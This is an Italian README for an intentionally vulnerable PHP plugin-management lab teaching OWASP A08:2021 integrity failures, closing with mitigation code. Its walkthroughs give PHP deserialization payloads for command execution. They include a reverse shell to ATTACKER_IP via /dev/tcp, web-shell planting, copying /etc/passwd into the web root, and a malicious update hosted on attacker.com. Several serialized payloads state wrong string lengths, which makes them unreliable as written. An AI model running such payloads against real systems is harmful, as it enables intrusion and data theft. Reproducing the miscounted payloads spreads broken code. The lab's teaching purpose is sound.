# OWASP A08:2021 – Software and Data Integrity Failures

## Descrizione del Modulo

Questo laboratorio dimostra vulnerabilità legate a **integrità di software e dati** nella categoria **OWASP A08:2021 – Software and Data Integrity Failures**. L'applicazione è un sistema di gestione plugin che contiene intenzionalmente vulnerabilità di deserializzazione non sicura, verifica di integrità mancante, e meccanismi di aggiornamento vulnerabili.

## ⚠️ ATTENZIONE

**Questa applicazione contiene vulnerabilità intenzionali. NON utilizzare in produzione o in ambienti reali.**

## Scenario

Sistema di gestione plugin che permette:
- Upload e installazione di plugin
- Configurazione di plugin tramite dati serializzati
- Aggiornamento automatico di plugin
- Gestione di hash e firme digitali (non verificate)

## Setup

### 1. Avvio Ambiente Docker

```bash
docker-compose up -d
```

L'applicazione sarà disponibile su: `http://localhost:8008`

Il database MySQL sarà accessibile su: `localhost:3308`

### 2. Credenziali Database

- **Host:** `db` (interno Docker) o `localhost:3308` (esterno)
- **Database:** `plugin_system`
- **Username:** `root`
- **Password:** `rootpassword`

### 3. Account di Test

| Username | Password | Ruolo |
|----------|----------|-------|
| admin | password | admin |
| mario.rossi | password | user |
| lucia.verdi | password | user |

## Vulnerabilità Presenti

### 1. Deserializzazione Non Sicura (PHP unserialize())

**File:** `install_plugin.php`, `plugin_config.php`, `PluginLoader.php`

**Descrizione:** Il sistema deserializza dati di configurazione senza verificare integrità, tipo di oggetto, o contenuto. Un attaccante può creare oggetti serializzati malevoli che eseguono codice arbitrario quando vengono deserializzati.

**Impatto:**
- Esecuzione di codice arbitrario (RCE)
- Bypass di controlli di sicurezza
- Accesso non autorizzato al sistema
- Modifica di file sul server

**Come sfruttarla:**

#### Passo 1: Accedere al Sistema

1. Vai su `http://localhost:8008`
2. Accedi con le credenziali:
   - Username: `admin`
   - Password: `password`
3. Vai su "Plugin" → seleziona un plugin → "Configura"

#### Passo 2: Creare Payload di Deserializzazione

La classe `PluginLoader` contiene magic methods vulnerabili (`__wakeup()`, `__destruct()`) che eseguono comandi arbitrari.

**Payload Base per RCE:**

```php
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}
```

**Spiegazione:**
- `O:12:"PluginLoader"` - Crea un oggetto della classe PluginLoader
- `2` - Numero di proprietà
- `s:12:"plugin_file"` - Proprietà `plugin_file` (stringa di 12 caratteri)
- `s:0:""` - Valore vuoto
- `s:7:"command"` - Proprietà `command` (stringa di 7 caratteri)
- `s:17:"id > /tmp/test.txt"` - Comando da eseguire

#### Passo 3: Inserire Payload nella Configurazione

1. Vai su `http://localhost:8008/plugin_config.php?id=1`
2. Nel campo "Configurazione (formato serializzato PHP)", inserisci:

```php
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}
```

3. Clicca su "Salva Configurazione"
4. Il comando verrà eseguito immediatamente durante la deserializzazione!
5. **Dopo il salvataggio, la pagina mostrerà automaticamente l'output del comando** se è stato eseguito correttamente

#### Passo 4: Verificare Esecuzione

**Metodo 1: Verifica nella pagina web**
- Dopo aver salvato la configurazione, se il comando è stato eseguito, vedrai un alert giallo con l'output del comando nella stessa pagina

**Metodo 2: Verifica tramite container Docker**
1. Accedi al container Docker:
   ```bash
   docker exec -it <container_id> bash
   ```
2. Verifica che il file sia stato creato:
   ```bash
   cat /tmp/test.txt
   ```
   oppure
   ```bash
   ls -la /tmp/plugin_exec_*.txt
   ```

**Metodo 3: Verifica tramite file accessibile via web**
Usa un payload che scrive l'output in una directory accessibile via web:
```php
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:28:"whoami > /var/www/html/whoami.txt";}
```
Poi visita `http://localhost:8008/whoami.txt` per vedere l'output.

#### Payload Avanzati

**Esecuzione Comando con Output (visibile nella pagina):**

```php
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}
```

Dopo aver salvato, l'output del comando verrà mostrato automaticamente nella pagina di configurazione.

**Esecuzione Comando con Output (accessibile via web):**

```php
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:28:"whoami > /var/www/html/whoami.txt";}
```

Dopo aver salvato, visita `http://localhost:8008/whoami.txt` per vedere l'output.

**Reverse Shell:**

```php
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:58:"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'";}
```

**Leggere File Sensibili:**

```php
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:35:"cat /etc/passwd > /var/www/html/passwd.txt";}
```

Dopo aver salvato, visita `http://localhost:8008/passwd.txt` per vedere il contenuto.

**Modificare File (creare web shell):**

```php
O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:42:"echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php";}
```

Dopo aver salvato, visita `http://localhost:8008/shell.php?cmd=id` per eseguire comandi.

#### Sfruttare __destruct() con PluginConfig

La classe `PluginConfig` ha un magic method `__wakeup()` che esegue callback arbitrari:

```php
O:12:"PluginConfig":2:{s:8:"settings";a:0:{};s:8:"callback";s:6:"system";}
```

**Nota:** Questo payload richiede che il callback sia una funzione valida. Per eseguire comandi, usa:

```php
O:12:"PluginConfig":2:{s:8:"settings";a:0:{};s:8:"callback";s:13:"exec";}
```

### 2. Verifica di Integrità Mancante

**File:** `install_plugin.php`, `upload_plugin.php`, `update_plugin.php`

**Descrizione:** Il sistema genera hash e firme digitali per i plugin, ma non li verifica mai prima di installare o eseguire i plugin. Un attaccante può modificare i file plugin mantenendo lo stesso hash (se conosce l'algoritmo) o semplicemente ignorando la verifica.

**Impatto:**
- Installazione di plugin modificati
- Esecuzione di codice malevolo
- Bypass di controlli di sicurezza
- Supply chain attacks

**Come sfruttarla:**

#### Passo 1: Identificare Hash Non Verificato

1. Vai su `http://localhost:8008/plugins.php`
2. Clicca su "Installa" per un plugin
3. Nota che l'hash è mostrato ma non verificato prima dell'installazione

#### Passo 2: Modificare Plugin Senza Aggiornare Hash

1. Accedi al container Docker:
   ```bash
   docker exec -it <container_id> bash
   ```
2. Modifica un file plugin esistente:
   ```bash
   echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/uploads/malicious_plugin.php
   ```
3. Aggiorna il database per puntare al file modificato:
   ```sql
   UPDATE plugins SET file_path = '/var/www/html/uploads/malicious_plugin.php' WHERE id = 1;
   ```
4. Il sistema installerà il plugin modificato senza verificare l'hash!

#### Passo 3: Upload Plugin con Hash Fittizio

1. Vai su `http://localhost:8008/upload_plugin.php` (richiede admin)
2. Carica un plugin malevolo
3. Il sistema genera un hash MD5, ma non lo verifica mai
4. Puoi inserire qualsiasi hash nel database e il sistema lo accetterà

### 3. Upload Senza Controlli

**File:** `upload_plugin.php`

**Descrizione:** Il sistema permette l'upload di file plugin senza verificare tipo file, dimensione, contenuto, o integrità. Un attaccante può caricare file PHP arbitrari che verranno eseguiti sul server.

**Impatto:**
- Upload di file malevoli
- Esecuzione di codice arbitrario
- Path traversal
- Bypass di restrizioni

**Come sfruttarla:**

#### Passo 1: Creare Plugin Malevolo

Crea un file `malicious_plugin.php`:

```php
<?php
// Web Shell
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

#### Passo 2: Caricare Plugin

1. Vai su `http://localhost:8008/upload_plugin.php`
2. Compila il form:
   - Nome: `malicious`
   - Versione: `1.0.0`
   - File: seleziona `malicious_plugin.php`
   - Configurazione: `a:0:{}`
3. Clicca su "Carica Plugin"
4. Il file verrà caricato senza controlli!

#### Passo 3: Accedere al Plugin

1. Il file sarà in `/var/www/html/uploads/malicious_plugin.php`
2. Accedi a: `http://localhost:8008/uploads/malicious_plugin.php?cmd=id`
3. Il comando verrà eseguito!

#### Path Traversal

1. Carica un file con nome: `../../../etc/passwd`
2. Il sistema non sanitizza il nome file
3. Il file potrebbe essere scritto in una directory diversa

### 4. Dependency Confusion

**File:** `upload_plugin.php`, `plugins.php`

**Descrizione:** Il sistema non verifica l'autenticità dei nomi dei plugin. Un attaccante può caricare un plugin con un nome simile a uno legittimo (es. `analytics` vs `analytics-pro`) che verrà installato al posto di quello originale.

**Impatto:**
- Sostituzione di plugin legittimi
- Installazione di plugin malevoli
- Supply chain attacks
- Furto di dati

**Come sfruttarla:**

#### Passo 1: Identificare Plugin Legittimi

1. Vai su `http://localhost:8008/plugins.php`
2. Nota i nomi dei plugin esistenti:
   - `analytics`
   - `backup`
   - `security`

#### Passo 2: Creare Plugin con Nome Simile

1. Crea un plugin malevolo chiamato `analytics-pro` o `analytics-update`
2. Caricalo tramite `upload_plugin.php`
3. Gli utenti potrebbero installarlo pensando sia un'estensione legittima

#### Passo 3: Sfruttare Confusione

1. Crea un plugin con nome identico ma versione più alta: `analytics` v2.0.0
2. Il sistema potrebbe preferire la versione più recente
3. Gli utenti installeranno il plugin malevolo

### 5. Aggiornamenti da Sorgenti Non Verificate

**File:** `update_plugin.php`

**Descrizione:** Il sistema scarica e installa aggiornamenti da URL senza verificare autenticità, integrità (hash), o firma digitale. Un attaccante può compromettere l'URL o eseguire un attacco Man-in-the-Middle per sostituire l'aggiornamento con codice malevolo.

**Impatto:**
- Download di codice malevolo
- Supply chain attacks
- Man-in-the-Middle attacks
- Compromissione di tutti i sistemi che usano il plugin

**Come sfruttarla:**

#### Passo 1: Identificare URL di Aggiornamento

1. Vai su `http://localhost:8008/plugins.php`
2. Clicca su "Aggiorna" per un plugin
3. Nota l'URL di aggiornamento (es. `http://plugins.example.com/analytics_v1.1.0.php`)

#### Passo 2: Creare Server Malevolo

1. Crea un file PHP malevolo su un server controllato:
   ```php
   <?php
   // Plugin malevolo
   system($_GET['cmd']);
   ?>
   ```
2. Mettilo su un server web accessibile (es. `http://attacker.com/malicious.php`)

#### Passo 3: Modificare URL nel Database

1. Accedi al database:
   ```bash
   mysql -h localhost -P 3308 -u root -prootpassword plugin_system
   ```
2. Aggiorna l'URL di aggiornamento:
   ```sql
   UPDATE plugin_updates SET update_url = 'http://attacker.com/malicious.php' WHERE id = 1;
   ```
3. Vai su `http://localhost:8008/update_plugin.php?plugin_id=1&update_id=1`
4. Clicca su "Aggiorna Plugin"
5. Il sistema scaricherà e installerà il file malevolo!

#### Passo 4: Man-in-the-Middle Attack

1. Se l'URL usa HTTP invece di HTTPS, un attaccante può intercettare il traffico
2. Sostituire il file durante il download
3. Il sistema installerà il file modificato senza verificare l'hash

## Esercizi Pratici

### Esercizio 1: Deserializzazione Base

1. Accedi come admin
2. Vai su "Configura" per un plugin
3. Inserisci un payload di deserializzazione che esegue `whoami`
4. Verifica che il comando sia stato eseguito

### Esercizio 2: Reverse Shell

1. Crea un payload di deserializzazione che apre una reverse shell
2. Metti in ascolto un listener sulla tua macchina:
   ```bash
   nc -lvp 4444
   ```
3. Inserisci il payload nella configurazione del plugin
4. Verifica la connessione

### Esercizio 3: Upload Web Shell

1. Crea un file PHP che esegue comandi arbitrari
2. Caricalo tramite `upload_plugin.php`
3. Accedi al file caricato ed esegui comandi

### Esercizio 4: Modificare Plugin Esistente

1. Identifica un plugin installato
2. Modifica il file sul server
3. Reinstalla il plugin senza aggiornare l'hash
4. Verifica che il plugin modificato venga eseguito

### Esercizio 5: Dependency Confusion

1. Identifica un plugin legittimo (es. `analytics`)
2. Crea un plugin malevolo con nome simile (es. `analytics-pro`)
3. Caricalo e installalo
4. Verifica che venga trattato come plugin legittimo

## Mitigazioni (Da Implementare)

### Per Deserializzazione Non Sicura:

1. **Evitare Deserializzazione di Dati Non Fidati:**
   ```php
   // ❌ VULNERABILE
   $config = unserialize($user_input);
   
   // ✅ CORRETTO: Usa JSON invece di serialize()
   $config = json_decode($user_input, true);
   ```

2. **Whitelist di Classi Consentite:**
   ```php
   // ✅ CORRETTO: Verifica classe prima di deserializzare
   $allowed_classes = ['SafeConfig', 'PluginSettings'];
   $config = unserialize($data, ['allowed_classes' => $allowed_classes]);
   ```

3. **Verifica Integrità:**
   ```php
   // ✅ CORRETTO: Verifica hash prima di deserializzare
   $expected_hash = hash('sha256', $data);
   if ($expected_hash !== $stored_hash) {
       die("Integrity check failed");
   }
   $config = unserialize($data);
   ```

### Per Verifica di Integrità:

1. **Verifica Hash Prima dell'Installazione:**
   ```php
   // ✅ CORRETTO
   $calculated_hash = hash_file('sha256', $file_path);
   if ($calculated_hash !== $stored_hash) {
       die("Hash mismatch - file may be corrupted");
   }
   ```

2. **Usa Firma Digitale:**
   ```php
   // ✅ CORRETTO: Verifica firma digitale
   if (!openssl_verify($file_content, $signature, $public_key)) {
       die("Signature verification failed");
   }
   ```

3. **Usa Algoritmi Forti:**
   ```php
   // ❌ VULNERABILE: MD5 è debole
   $hash = md5_file($file);
   
   // ✅ CORRETTO: Usa SHA-256 o superiore
   $hash = hash_file('sha256', $file);
   ```

### Per Upload:

1. **Valida Tipo File:**
   ```php
   // ✅ CORRETTO
   $allowed_types = ['application/x-php'];
   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime_type = finfo_file($finfo, $file['tmp_name']);
   if (!in_array($mime_type, $allowed_types)) {
       die("Invalid file type");
   }
   ```

2. **Valida Dimensione:**
   ```php
   // ✅ CORRETTO
   $max_size = 5 * 1024 * 1024; // 5MB
   if ($file['size'] > $max_size) {
       die("File too large");
   }
   ```

3. **Sanitizza Nome File:**
   ```php
   // ✅ CORRETTO
   $file_name = basename($file['name']);
   $file_name = preg_replace('/[^a-zA-Z0-9._-]/', '', $file_name);
   ```

### Per Aggiornamenti:

1. **Usa HTTPS:**
   ```php
   // ✅ CORRETTO: Verifica che l'URL sia HTTPS
   if (parse_url($update_url, PHP_URL_SCHEME) !== 'https') {
       die("Only HTTPS URLs allowed");
   }
   ```

2. **Verifica Certificato:**
   ```php
   // ✅ CORRETTO: Verifica certificato SSL
   $context = stream_context_create([
       'ssl' => [
           'verify_peer' => true,
           'verify_peer_name' => true,
       ]
   ]);
   $file = file_get_contents($url, false, $context);
   ```

3. **Verifica Hash Dopo Download:**
   ```php
   // ✅ CORRETTO
   $downloaded_file = file_get_contents($url);
   $calculated_hash = hash('sha256', $downloaded_file);
   if ($calculated_hash !== $expected_hash) {
       die("Hash mismatch");
   }
   ```

## Riferimenti OWASP

- [OWASP Top 10 2021 - A08:2021](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [OWASP Dependency Confusion](https://owasp.org/www-community/vulnerabilities/Dependency_Confusion)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

## Struttura File

```
A08_Software_Data_Integrity_Failures/
├── docker-compose.yml          # Configurazione Docker
├── Dockerfile                   # Immagine PHP/Apache
├── init.sql                     # Popolamento database
├── README.md                    # Questa documentazione
├── db_connect.php               # Connessione database
├── PluginLoader.php             # ⚠️ VULNERABILE: Classe con magic methods pericolosi
├── index.php                    # Homepage
├── login.php                    # Pagina login
├── login_process.php            # Processo login
├── register.php                 # Pagina registrazione
├── register_process.php          # Processo registrazione
├── dashboard.php                # Dashboard utente
├── plugins.php                  # Lista plugin
├── upload_plugin.php            # ⚠️ VULNERABILE: Upload senza controlli
├── install_plugin.php           # ⚠️ VULNERABILE: Installazione con deserializzazione non sicura
├── update_plugin.php            # ⚠️ VULNERABILE: Aggiornamento senza verifica
├── plugin_config.php            # ⚠️ VULNERABILE: Configurazione con deserializzazione non sicura
├── header.php                   # Header comune
├── footer.php                   # Footer comune
└── style.css                    # Stili CSS
```

## Note Finali

Questo modulo dimostra l'importanza di:
- Verificare sempre l'integrità di software e dati prima dell'uso
- Evitare deserializzazione di dati non fidati
- Implementare controlli di autenticità per aggiornamenti
- Validare tutti gli input, inclusi file caricati
- Usare firme digitali per verificare l'autenticità del software

**Ricorda:** Queste vulnerabilità sono intenzionali e create per scopi didattici. In produzione, implementa sempre tutte le mitigazioni appropriate.

